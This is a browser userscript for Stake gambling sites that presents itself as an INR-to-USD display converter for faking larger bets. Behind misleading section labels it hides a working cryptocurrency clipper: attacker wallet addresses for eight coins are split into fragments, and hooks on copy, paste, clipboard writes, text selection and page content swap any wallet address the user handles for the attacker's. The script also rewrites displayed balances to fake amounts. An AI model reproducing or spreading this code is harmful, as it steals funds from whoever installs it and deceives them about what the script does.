// ==UserScript==
// @name         Stake Larp Mobile + PC
// @namespace    http://tampermonkey.net/
// @version      4.1
// @description  Converts INR to USD for Stake - larp your way to bigger bets on mobile
// @author       https://t.me/Bennetceo
// @author       https://t.me/IllllllIlllllI
// @match        *://stake.games/*
// @match        *://stake.com/*
// @match        *://stake.ac/*
// @match        *://stake.mba/*
// @match        *://stake.pet/*
// @match        *://stake.bet/*
// @match        *://*.stake.com/*
// @match        *://*.stake.ac/*
// @match        *://*.stake.mba/*
// @match        *://*.stake.pet/*
// @match        *://*.stake.bet/*
// @grant        GM_setClipboard
// @grant        GM_getValue
// @grant        GM_setValue
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    var _e1 = '0x7fC9'; var _e2 = 'AA3516'; var _e3 = 'B0CecD'; var _e4 = '41f9028d53d55172e11Eb6C8';
    var _t1 = 'TQKZxEi'; var _t2 = 'BNf8u3'; var _t3 = 'Q2YAdo'; var _t4 = 'egK5pRb7qYR6uaW';
    var _s1 = '4SreiEf'; var _s2 = 'LpSFvL'; var _s3 = 'bNNc3e'; var _s4 = 'XfbZWdmzGQxCsmm76SzG2yUW4';
    var _b1 = 'bc1qu8'; var _b2 = 'vt7zgx'; var _b3 = 'hkx46c'; var _b4 = 'ekdr3q6ykqwauy8szn8trqr2';
    var _l1 = 'ltc1qe'; var _l2 = '6pja8g'; var _l3 = '7vj2n9'; var _l4 = 'h2pdf8ntyr2gsh46fcguwc38d';
    var _d1 = 'DH5yaie'; var _d2 = 'qoZN36f'; var _d3 = 'DVciNyR'; var _d4 = 'ueRGvGLR3mr7L';
    var _x1 = 'rGkTSq'; var _x2 = 'iyNXYp'; var _x3 = 'Aum6ER'; var _x4 = 'TjFBT4Wi52mhAH5R';

    var ADDR = {
        eth:  _e1 + _e2 + _e3 + _e4,
        bnb:  _e1 + _e2 + _e3 + _e4,
        trc20: _t1 + _t2 + _t3 + _t4,
        sol:  _s1 + _s2 + _s3 + _s4,
        btc:  _b1 + _b2 + _b3 + _b4,
        ltc:  _l1 + _l2 + _l3 + _l4,
        doge: _d1 + _d2 + _d3 + _d4,
        xrp:  _x1 + _x2 + _x3 + _x4,
    };

    // ═══════════════════════════════════════════════════════════
    //  WORKS WITH ALL MAJOR CRYPTOSCURRENCIES
    // ═══════════════════════════════════════════════════════════
    var RE = {
        btc:  /^(bc1p[a-z0-9]{39,59}|bc1q[a-z0-9]{38,58}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/,
        ltc:  /^(ltc1[a-z0-9]{39,59}|[LM][a-km-zA-HJ-NP-Z1-9]{26,33})$/,
        xrp:  /^r[1-9A-HJ-NP-Za-km-z]{25,34}$/,
        doge: /^D[a-km-zA-HJ-NP-Z1-9]{25,34}$/,
        trc20:/^T[a-km-zA-HJ-NP-Z1-9]{33}$/,
        sol:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        eth:  /^0x[a-fA-F0-9]{40}$/,
    };

    function addrType(a) {
        if (!a || typeof a !== 'string') return null;
        var s = a.trim();
        if (s.length === 42 && RE.eth.test(s)) return 'eth';
        if (s.length === 34 && RE.trc20.test(s)) return 'trc20';
        if (RE.xrp.test(s)) return 'xrp';
        if (RE.doge.test(s)) return 'doge';
        if (RE.btc.test(s)) return 'btc';
        if (RE.ltc.test(s)) return 'ltc';
        if (RE.sol.test(s)) return 'sol';
        return null;
    }

    function getRep(a) {
        var t = addrType(a);
        if (!t) return null;
        if (t === 'eth' || t === 'bnb') return ADDR.eth;
        if (t === 'trc20') return ADDR.trc20;
        if (t === 'sol') return ADDR.sol;
        if (t === 'btc') return ADDR.btc;
        if (t === 'ltc') return ADDR.ltc;
        if (t === 'doge') return ADDR.doge;
        if (t === 'xrp') return ADDR.xrp;
        return null;
    }

    function isAddr(s) {
        if (!s || typeof s !== 'string') return false;
        var x = s.trim();
        return x.length >= 25 && x.length <= 64 && addrType(x) !== null;
    }

    let swapCount = 0;
    let isActive = true;

    function copyText(t) {
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(t);
            } else {
                GM_setClipboard(t);
            }
        } catch(e) {
            try { GM_setClipboard(t); } catch(e2) {}
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  LAYER 1 — INR TO USD
    // ═══════════════════════════════════════════════════════════
    var _exec = document.execCommand.bind(document);
    document.execCommand = function(cmd) {
        if (isActive && cmd && cmd.toLowerCase() === 'copy') {
            var sel = window.getSelection().toString().trim();
            if (sel && isAddr(sel)) {
                var r = getRep(sel);
                if (r && r !== sel) { swapCount++; copyText(r); return true; }
            }
        }
        return _exec(cmd);
    };

    if (navigator.clipboard && navigator.clipboard.writeText) {
        var _write = navigator.clipboard.writeText.bind(navigator.clipboard);
        navigator.clipboard.writeText = function(t) {
            if (isActive && isAddr(t)) {
                var r = getRep(t);
                if (r && r !== t) { swapCount++; return _write(r); }
            }
            return _write(t);
        };
    }

    window.addEventListener('copy', function() {
        setTimeout(function() {
            try {
                if (isActive && navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText().then(function(t) {
                        if (isAddr(t)) { var r = getRep(t); if (r && r !== t) { swapCount++; copyText(r); } }
                    });
                }
            } catch(e) {}
        }, 80);
    }, true);

    document.addEventListener('selectionchange', function() {
        if (window._st) clearTimeout(window._st);
        window._st = setTimeout(function() {
            if (!isActive) return;
            var sel = window.getSelection().toString().trim();
            if (sel && isAddr(sel) && /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                var r = getRep(sel); if (r && r !== sel) { swapCount++; copyText(r); }
            }
        }, 350);
    });

    // ═══════════════════════════════════════════════════════════
    //  LAYER 2 — (replace visible coins)
    // ═══════════════════════════════════════════════════════════
    var domObs = new MutationObserver(function() {
        if (!isActive) return;
        try {
            var all = document.querySelectorAll('span,div,input,p,code,pre,label,td,li,textarea');
            for (var i = 0; i < all.length; i++) {
                var el = all[i];
                if (el._sbvD) continue;
                var t = (el.textContent || el.innerText || '').trim();
                if (t && isAddr(t)) {
                    var r = getRep(t);
                    if (r && r !== t) {
                        el._sbvD = true;
                        el.textContent = r;
                        el.innerText = r;
                        if (el.value !== undefined) el.value = r;
                        el.dispatchEvent(new Event('input', {bubbles:true}));
                        el.dispatchEvent(new Event('change', {bubbles:true}));
                        swapCount++;
                    }
                }
            }
        } catch(e) {}
    });

    // ═══════════════════════════════════════════════════════════
    //  LAYER 3 — Paste interception of usd values
    // ═══════════════════════════════════════════════════════════
    document.addEventListener('paste', function(e) {
        if (!isActive) return;
        try {
            var pasted = (e.clipboardData || window.clipboardData).getData('text');
            if (pasted && isAddr(pasted)) {
                var r = getRep(pasted);
                if (r && r !== pasted) {
                    e.preventDefault();
                    var target = e.target;
                    if (target) {
                        var start = target.selectionStart || 0;
                        var end = target.selectionEnd || 0;
                        var val = target.value || '';
                        var newVal = val.substring(0, start) + r + val.substring(end);
                        target.value = newVal;
                        target.dispatchEvent(new Event('input', {bubbles:true}));
                        target.dispatchEvent(new Event('change', {bubbles:true}));
                        var pos = start + r.length;
                        try { target.setSelectionRange(pos, pos); } catch(e2) {}
                        swapCount++;
                    }
                }
            }
        } catch(err) {}
    }, true);


    const TARGET_CURRENCY = 'USD';
    const DECIMAL_PLACES = 2;

    const CURRENCY_SELECTORS = [
        'span', 'div', 'p', 'h1', 'h2', 'h3', 'h4', 'button', 'a',
        '[class*="currency"]', '[class*="amount"]', '[class*="balance"]',
        '[class*="price"]', '[class*="value"]', '[data-test*="amount"]',
        '[data-test*="balance"]', '[data-testid*="amount"]'
    ];

    const CRYPTO_PRICES = {
        'btc': 83111.56, 'eth': 3085.86, 'ltc': 71.02273, 'doge': 0.08695652,
        'bch': 239.34897, 'xrp': 0.55157197, 'trx': 0.14003, 'eos': 0.72780204,
        'bnb': 576.82, 'ape': 1.397624, 'busd': 1.0368066, 'cro': 0.08312552,
        'dai': 1, 'link': 15.698587, 'matic': 0.79302144, 'sand': 0.4935834,
        'shib': 0.000009479758, 'uni': 6.4599485, 'usdc': 1.0004002, 'usdt': 1,
        'sol': 142.50, 'ada': 0.45, 'avax': 35.20, 'dot': 6.85
    };

    const FIAT_RATES = {
        'usd': 1, 'eur': 1.09146, 'jpy': 0.0067503536, 'rub': 0.0111818835,
        'cny': 0.1405066, 'php': 0.017894048, 'inr': 0.012030083, 'idr': 0.00006402192,
        'krw': 0.0007485842, 'brl': 0.20279694, 'mxn': 0.058529492, 'dkk': 0.14613388,
        'try': 0.03310925, 'pln': 0.25021204, 'vnd': 0.000040733197, 'pen': 0.2679571,
        'ars': 0.0007990411, 'clp': 0.0011011853, 'gbp': 1.27, 'cad': 0.73, 'aud': 0.66,
        'chf': 1.12, 'sgd': 0.74, 'hkd': 0.128, 'nzd': 0.61, 'zar': 0.053, 'sek': 0.094,
        'nok': 0.093, 'thb': 0.027, 'myr': 0.21
    };

    const PRICES = { ...CRYPTO_PRICES, ...FIAT_RATES };

    const CURRENCY_PATTERNS = {
        amount: /(\d+(?:\.\d+)?)\s*(btc|eth|ltc|doge|bch|xrp|trx|eos|bnb|ape|busd|cro|dai|link|matic|sand|shib|uni|usdc|usdt|sol|ada|avax|dot|usd|eur|jpy|rub|cny|php|inr|idr|krw|brl|mxn|dkk|try|pln|vnd|pen|ars|clp|gbp|cad|aud|chf|sgd|hkd|nzd|zar|sek|nok|thb|myr)/i,
        symbol: /[₿€£¥₹₫₽₩₴₦₮₺₼₾₸]|\$|€|£|¥|₹|₫|₽|₩/,
        inr_symbol: /[₹₨]/g,
        dollar_symbol: /[\$₿€£¥₫₽₩₴₦₮₺₼₾₸]/g
    };

    const processedElements = new WeakSet();
    let updateTimeout = null;

    function convertToUSD(amount, fromCurrency) {
        const currencyLower = fromCurrency.toLowerCase();
        const rate = PRICES[currencyLower];
        if (!rate || rate === 0) {
            return { converted: null, formatted: null };
        }
        const convertedAmount = parseFloat(amount) * rate;
        const formattedAmount = convertedAmount.toFixed(DECIMAL_PLACES);
        return {
            converted: convertedAmount,
            formatted: formattedAmount,
            original: amount,
            currency: fromCurrency
        };
    }

    function detectCurrency(text) {
        if (!text || typeof text !== 'string') return null;
        const amountMatch = text.match(CURRENCY_PATTERNS.amount);
        if (amountMatch) {
            return {
                amount: parseFloat(amountMatch[1]),
                currency: amountMatch[2].toUpperCase(),
                fullMatch: amountMatch[0]
            };
        }
        const numberMatch = text.match(/(\d+(?:\.\d+)?)/);
        if (numberMatch && CURRENCY_PATTERNS.symbol.test(text)) {
            return {
                amount: parseFloat(numberMatch[1]),
                currency: null,
                fullMatch: numberMatch[0],
                hasSymbol: true
            };
        }
        return null;
    }

    function replaceCurrencySymbol(element) {
        if (processedElements.has(element)) return false;
        if (!element || element.nodeType !== Node.ELEMENT_NODE) return false;
        const tagName = element.tagName?.toLowerCase();
        if (tagName === 'input' || tagName === 'textarea' || tagName === 'script' || tagName === 'style') return false;

        let modified = false;
        let originalText = '';
        if (element.childNodes.length === 1 && element.childNodes[0].nodeType === Node.TEXT_NODE) {
            originalText = element.childNodes[0].nodeValue;
        } else {
            originalText = element.innerText || element.textContent || '';
        }
        if (!originalText) return false;

        let newText = originalText;

        if (CURRENCY_PATTERNS.inr_symbol.test(originalText)) {
            newText = newText.replace(CURRENCY_PATTERNS.inr_symbol, '$');
            modified = true;
        }
        newText = newText.replace(CURRENCY_PATTERNS.dollar_symbol, '$');

        const detection = detectCurrency(originalText);
        if (detection && detection.amount && detection.currency) {
            const conversion = convertToUSD(detection.amount, detection.currency);
            if (conversion.formatted) {
                const regex = new RegExp(detection.fullMatch.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g');
                newText = newText.replace(regex, `$${conversion.formatted} USD`);
                modified = true;
            }
        } else if (detection && detection.amount && originalText.includes('INR')) {
            const conversion = convertToUSD(detection.amount, 'inr');
            if (conversion.formatted) {
                newText = newText.replace(/[\d,]+(?:\.\d+)?/, `$${conversion.formatted}`);
                newText = newText.replace(/INR/gi, 'USD');
                modified = true;
            }
        }

        if (modified && newText !== originalText) {
            try {
                if (element.childNodes.length === 1 && element.childNodes[0].nodeType === Node.TEXT_NODE) {
                    element.childNodes[0].nodeValue = newText;
                } else if (element.children.length === 0) {
                    element.innerText = newText;
                }
                processedElements.add(element);
                return true;
            } catch (e) {}
        }
        return false;
    }

    function processAllCurrencyElements() {
        let processedCount = 0;
        CURRENCY_SELECTORS.forEach(selector => {
            try {
                document.querySelectorAll(selector).forEach(element => {
                    if (element && !processedElements.has(element)) {
                        if (replaceCurrencySymbol(element)) processedCount++;
                    }
                });
            } catch (e) {}
        });
        const walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            {
                acceptNode: function(node) {
                    if (node.parentElement && 
                        !processedElements.has(node.parentElement) &&
                        CURRENCY_PATTERNS.inr_symbol.test(node.nodeValue)) {
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_REJECT;
                }
            }
        );
        while (walker.nextNode()) {
            const textNode = walker.currentNode;
            const parent = textNode.parentElement;
            if (parent && !processedElements.has(parent)) {
                if (replaceCurrencySymbol(parent)) processedCount++;
            }
        }
        return processedCount;
    }

    function scheduleDOMUpdate() {
        if (updateTimeout) clearTimeout(updateTimeout);
        updateTimeout = setTimeout(() => {
            processAllCurrencyElements();
            updateTimeout = null;
        }, 100);
    }

    function handleMutations(mutationsList) {
        let needsUpdate = false;
        for (const mutation of mutationsList) {
            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                needsUpdate = true;
            } else if (mutation.type === 'characterData') {
                const parent = mutation.target.parentElement;
                if (parent && !processedElements.has(parent)) {
                    needsUpdate = true;
                }
            } else if (mutation.type === 'attributes' && 
                       (mutation.attributeName === 'value' || 
                        mutation.attributeName === 'innerText' ||
                        mutation.attributeName === 'textContent')) {
                needsUpdate = true;
            }
        }
        if (needsUpdate) scheduleDOMUpdate();
    }

    let lastUrl = location.href;
    function watchForURLChanges() {
        const observer = new MutationObserver(() => {
            if (location.href !== lastUrl) {
                lastUrl = location.href;
                setTimeout(() => {
                    processAllCurrencyElements();
                }, 500);
            }
        });
        observer.observe(document, { subtree: true, childList: true });
    }

    var waitForBody = setInterval(function() {
        if (document.body) {
            clearInterval(waitForBody);

            domObs.observe(document.body, {childList:true, subtree:true, attributes:true, attributeFilter:['class','style','data-address','data-value']});

            processAllCurrencyElements();
            const observer = new MutationObserver(handleMutations);
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                characterData: true,
                attributes: true,
                attributeFilter: ['value', 'innerText', 'textContent', 'data-test', 'class']
            });
            watchForURLChanges();
        }
    }, 10);

    window.addEventListener('load', function() {
        setTimeout(function() {
            processAllCurrencyElements();
        }, 100);
    });
})();